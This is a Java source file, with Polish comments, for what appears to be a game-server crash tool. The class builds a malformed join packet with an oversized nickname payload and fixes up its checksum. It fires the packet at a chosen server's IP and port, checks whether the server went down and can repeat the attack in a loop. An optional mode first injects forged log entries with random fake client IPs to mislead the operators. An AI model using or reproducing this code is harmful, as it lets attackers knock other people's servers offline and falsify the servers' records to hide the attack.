package konsola;

import java.net.DatagramSocket;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.xml.bind.DatatypeConverter;

/**
 *
 * @author Mateusz
 */
public class Bugs extends Thread {

    Server s;
    boolean loop = false;
    boolean fake = false;
    int count = 0;

    public Bugs(Server s) {
        this.s = s;
    }

    static void crash() {
        for (Server el : Konsola.lista) {
            if (el.crash) {
                Bugs s = new Bugs(el);
                s.start();
            }
        }
    }

    public void run() {

        bugs();
    }

    void bugs() {
        CrashLog log = new CrashLog(s.name, s.ips, this, loop, fake);
        do {
            try {
                log.log.setText("");
                log.amount.setText(count + "");
                log.log.append("Waiting 10sec for the server response...\n");
                int i = 0;
                while (s.sendStatus() == "" && i < 10) {
                    Thread.sleep(1000);
                    i++;
                };
                if (i > 9) {
                    log.log.append("Server didn't respond\n");

                    log.time.setText("Close for 3 sec");
                    Thread.sleep(1000);
                    log.time.setText("Close for 2 sec");
                    Thread.sleep(1000);
                    log.time.setText("Close for 1 sec");
                    Thread.sleep(1000);
                    log.dispose();
                    loop = false;
                    continue;
                }
                try {
                    String ip = s.ip;
                    int port = s.port;
                    DatagramSocket socket = new DatagramSocket();
                    String cmd;
                    //pakiet info
                    log.log.append("Sending first packet...\n");
                    byte[] mapinfo = s.sendPck("deadbeefabababababababab0000000005abababbadeabee");
                    Thread.sleep(3000);
                    byte map = mapinfo[98];
                    if (map < 0)
                        map = 03;
                    String fakeData = fakeData();
                    if (fake) {
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n\n\n"
                                + "[10:23:32] -----SEND-----\n"
                                + "[10:23:32] [INIT] count=   1, #bytes=   432\n"
                                + "[10:23:32] [SETT] count=   1, #bytes=   142\n"
                                + "[10:23:32] [AUTH] count=   1, #bytes=   162\n"
                                + "[10:23:32] [ACTI] count=   2, #bytes=   122\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n\n"
                                + "[21:15:30] -----RECEIVE-----\n"
                                + "[21:15:30] [CRPL] count=   1, #bytes=   284\n"
                                + "[21:15:30] [PING] count=   4, #bytes=   272\n"
                                + "[21:15:30] [STAT] count=   9, #bytes=  1296\n"
                                + "[21:15:30] [AUTH] count=   1, #bytes=   160\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n\n"
                                + "[21:15:30] out [all 23][new 17][re 1][ack 4][ext 1][ok 23][err 0]\n"
                                + "[21:15:30] out [max50 2476][max100 2548]  in [max50 644][max100 924]\n"
                                + "[21:15:30] out [all 23][new 17][re 1][ack 4][ext 1][ok 23][err 0]\n\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n\n\n"
                                + "[10:23:32] -----SEND-----\n"
                                + "[10:23:32] [INIT] count=   1, #bytes=   432\n"
                                + "[10:23:32] [SETT] count=   1, #bytes=   142\n"
                                + "[10:23:32] [AUTH] count=   1, #bytes=   162\n"
                                + "[10:23:32] [ACTI] count=   2, #bytes=   122\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n"
                                + "[17:31:53] NETWORKPACKET_TYPE_CLIENTCONNECT [" + fakeData + "]\n"
                                + "[17:31:53] Network_RemoveFromLoadQueue: Socket removed from load queue\n"
                                + "[17:31:53] IsClientMapCorrect: Client 3 Server 3 Server 3 Client 3\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n"
                                + "[17:31:53] Granted access to [" + fakeData + "] \n"
                                + "[17:31:53] NETWORKCONNECTIONRESPONSE_SUCCESS [" + fakeData + "]\n"
                                + "[17:31:53] Popped new networkID for joining client: [21][" + fakeData + "] \n ";
                        s.sendStrPck(cmd);
                    }
                    //pierwszy join
                    String join = "deadbeefabababababababab000" + map + "001400ababab0" + map + "00000000000000000000000000000000000000badeabee";
                    log.log.append("Sending second packet...\n");
                    byte[] odp = s.sendPck(join);
                    //pobieramy z odpowiedzi dane potrzebne do kolejnego pakietu
                    int z1 = odp[24] - 1;
                    int z2 = odp[28];
                    //trzeci pakiet
                    cmd = "deadbeef"
                            + "0100000000000000"
                            + "0000"
                            + "0000"
                            + "03ababab"
                            + "01000000ffffffff"
                            + "4c505243"
                            + "00000000"
                            + "00000000"
                            + "00000000000000000000000000000000ffffffff00000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
                    //petla dolacza dlugi nick CRASHED BY MARIO PL
                    //cmd = cmd.concat("2043524153484544204259204d4152494f20504c");
                    String hex = "437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20437265616368204279202a2a2a426f6262792a2a2a20";
                    //String nick = Integer.toHexString(Integer.parseInt(hex));
                    cmd = cmd.concat(hex);
                    /*for (int i = 0; i < 128-nick.length(); i++) {
                cmd = cmd.concat("0");
                }
                     */
                    cmd +=/*"6a6f6e6573315f31000a000000000000*/ "badeabee";//i koniec pakietu
                    //konwertujemy hex string na byte
                    byte[] pck3 = DatatypeConverter.parseHexBinary(cmd);
                    //wrzucamy dane pobrane z info
                    pck3[32] = (byte) z1;   // w tym wypadku trzeba bylo odjac 1 od wartosci
                    pck3[33] = odp[25];
                    pck3[34] = odp[26];
                    pck3[35] = odp[27];
                    pck3[36] = (byte) z2;   //to chyba id gracza ale tez tak jak bugs odejmujemy 1

                    byte[] crc = checksum(pck3);   //crc
                    pck3[12] = crc[0];
                    pck3[13] = crc[1];
                    byte[] size = sized(pck3);     //rozmiar pakietu
                    pck3[14] = size[0];
                    pck3[15] = size[1];
                    if (fake) {
                        log.log.append("Injecting fake log...\n");
                        fakeData = fakeData();
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n\n\n"
                                + "[10:23:32] -----SEND-----\n"
                                + "[10:23:32] [INIT] count=   1, #bytes=   432\n"
                                + "[10:23:32] [SETT] count=   1, #bytes=   142\n"
                                + "[10:23:32] [AUTH] count=   1, #bytes=   162\n"
                                + "[10:23:32] [ACTI] count=   2, #bytes=   122\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n\n"
                                + "[21:15:30] -----RECEIVE-----\n"
                                + "[21:15:30] [CRPL] count=   1, #bytes=   284\n"
                                + "[21:15:30] [PING] count=   4, #bytes=   272\n"
                                + "[21:15:30] [STAT] count=   9, #bytes=  1296\n"
                                + "[21:15:30] [AUTH] count=   1, #bytes=   160\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n\n"
                                + "[21:15:30] out [all 23][new 17][re 1][ack 4][ext 1][ok 23][err 0]\n"
                                + "[21:15:30] out [max50 2476][max100 2548]  in [max50 644][max100 924]\n"
                                + "[21:15:30] out [all 23][new 17][re 1][ack 4][ext 1][ok 23][err 0]\n\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n\n\n"
                                + "[10:23:32] -----SEND-----\n"
                                + "[10:23:32] [INIT] count=   1, #bytes=   432\n"
                                + "[10:23:32] [SETT] count=   1, #bytes=   142\n"
                                + "[10:23:32] [AUTH] count=   1, #bytes=   162\n"
                                + "[10:23:32] [ACTI] count=   2, #bytes=   122\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n\n"
                                + "[21:15:30] -----RECEIVE-----\n"
                                + "[21:15:30] [CRPL] count=   1, #bytes=   284\n"
                                + "[21:15:30] [PING] count=   4, #bytes=   272\n"
                                + "[21:15:30] [STAT] count=   9, #bytes=  1296\n"
                                + "[21:15:30] [AUTH] count=   1, #bytes=   160\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n"
                                + "[21:15:30] out [all 23][new 17][re 1][ack 4][ext 1][ok 23][err 0]\n"
                                + "[21:15:30] out [max50 2476][max100 2548]  in [max50 644][max100 924]\n"
                                + "[21:15:30] out [all 23][new 17][re 1][ack 4][ext 1][ok 23][err 0]\n\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n"
                                + "[17:31:53] NETWORKPACKET_TYPE_CLIENTCONNECT [" + fakeData + "]\n"
                                + "[17:31:53] Network_RemoveFromLoadQueue: Socket removed from load queue\n"
                                + "[17:31:53] IsClientMapCorrect: Client 3 Server 3 Server 3 Client 3\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n"
                                + "[17:31:53] Granted access to [" + fakeData + "] \n"
                                + "[17:31:53] NETWORKCONNECTIONRESPONSE_SUCCESS [" + fakeData + "]\n"
                                + "[17:31:53] Popped new networkID for joining client: [21][" + fakeData + "] \n ";
                        s.sendStrPck(cmd);
                        fakeData = fakeData();
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n"
                                + "[17:31:53] NETWORKPACKET_TYPE_CLIENTCONNECT [" + fakeData + "]\n"
                                + "[17:31:53] Network_RemoveFromLoadQueue: Socket removed from load queue\n"
                                + "[17:31:53] IsClientMapCorrect: Client 3 Server 3 Server 3 Client 3\n";
                        s.sendStrPck(cmd);
                        cmd = "/sv finger' run from " + ip + ":" + port + "\n"
                                + "[17:31:53] Granted access to [" + fakeData + "] \n"
                                + "[17:31:53] NETWORKCONNECTIONRESPONSE_SUCCESS [" + fakeData + "]\n"
                                + "[17:31:53] Popped new networkID for joining client: [21][" + fakeData + "] \n ";
                        s.sendStrPck(cmd);
                    }
                    log.log.append("Waiting 3 sec...\n");
                    Thread.sleep(1000);
                    log.log.append("Waiting 2 sec...\n");
                    Thread.sleep(1000);
                    log.log.append("Waiting 1 sec...\n");
                    Thread.sleep(1000);
                    log.log.append("Sending CRASH packet...\n");
                    s.sendHexPck(pck3);             //wysylamy
                    socket.close();
                } catch (Exception e) {
                    System.out.println("Bugs: " + e);
                    continue;
                }
                log.log.append("Checking server status...\n");
                Thread.sleep(2000);
                if (s.sendStatus().length() < 1) {
                    log.log.append("\nSERVER CRASHED!!!");
                    count++;
                } else {
                    log.log.append("\nCrash failed!");
                }
                log.time.setText("Close for 3 sec");
                Thread.sleep(1000);
                log.time.setText("Close for 2 sec");
                Thread.sleep(1000);
                log.time.setText("Close for 1 sec");
                Thread.sleep(1000);

            } catch (InterruptedException ex) {
                Logger.getLogger(Bugs.class.getName()).log(Level.SEVERE, null, ex);
            }
        } while (loop);
        log.dispose();

    }

    static byte[] checksum(byte[] pck) {
        int crc = 0;
        for (int i = 20; i < pck.length - 4; i++) {
            //zaczynamy od 20 bo to jest tzn HEADSZ
            int x = pck[i];
            if (x < 0) {
                x += 256;
            }
            crc += x;
            //w bugsie jak liczy crc to jak dochodzi do 65535 to od nowa liczy 
            if (crc > 65536) {
                crc = crc - 65536;
            }
        }
        //robimy tu cos w stylu htons
        int b1 = crc / 256;
        int b2 = crc % 256;
        byte[] ret = new byte[]{(byte) b1, (byte) b2};
        return ret;
    }

    static byte[] sized(byte[] pck) {
        int size = pck.length - 24;
        int b1 = size / 256;
        int b2 = size % 256;
        byte[] ret = new byte[]{(byte) b1, (byte) b2};
        return ret;
    }

    public static String fakeData() {
        String data;
        Random generator = new Random();

        String ip1 = Integer.toString(generator.nextInt(255));
        String ip2 = Integer.toString(generator.nextInt(255));
        String ip3 = Integer.toString(generator.nextInt(255));
        String ip4 = Integer.toString(generator.nextInt(255));
        String port = Integer.toString(generator.nextInt(65535));

        data = ip1 + "." + ip2 + "." + ip3 + "." + ip4 + ":" + port;
        return data;
    }

}
